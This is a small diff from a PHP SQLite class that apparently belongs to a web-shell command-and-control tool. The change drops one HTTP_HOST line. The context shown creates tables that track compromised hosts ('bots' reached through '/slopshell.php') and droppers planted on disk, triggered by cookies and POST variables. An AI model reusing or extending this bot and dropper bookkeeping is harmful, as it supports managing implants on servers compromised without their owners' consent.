@@ -29,7 +29,6 @@ class slopSqlite extends \SQLite3
     public function firstRun(): array
     {
         $success_list = [];
-        $current_host = $_SERVER['HTTP_HOST'] ?? "localhost";
         $prepare_tables = [
             "main" => "CREATE TABLE IF NOT EXISTS sloppy_bots_main(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, datetime TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL, rhost TEXT UNIQUE NOT NULL, uri TEXT NOT NULL DEFAULT '/slopshell.php', uuid TEXT UNIQUE NOT NULL, os_flavor TEXT NOT NULL, check_in INTEGER DEFAULT 0 NOT NULL, agent TEXT NOT NULL DEFAULT 'sp/1.1', cname TEXT NOT NULL DEFAULT '-', cvalue TEXT NOT NULL DEFAULT '-');",
             "droppers" => "CREATE TABLE IF NOT EXISTS sloppy_bots_droppers(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,date_added TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,location_on_disk TEXT UNIQUE NOT NULL, post_var TEXT NOT NULL DEFAULT '-', cookiename TEXT NOT NULL DEFAULT '-', user_agent TEXT NOT NULL DEFAULT 'sp/1.1', dropper_type TEXT NOT NULL DEFAULT '-', uuid TEXT UNIQUE NOT NULL, activator TEXT NOT NULL DEFAULT '-', cookie_val TEXT UNIQUE NOT NULL DEFAULT '-');",
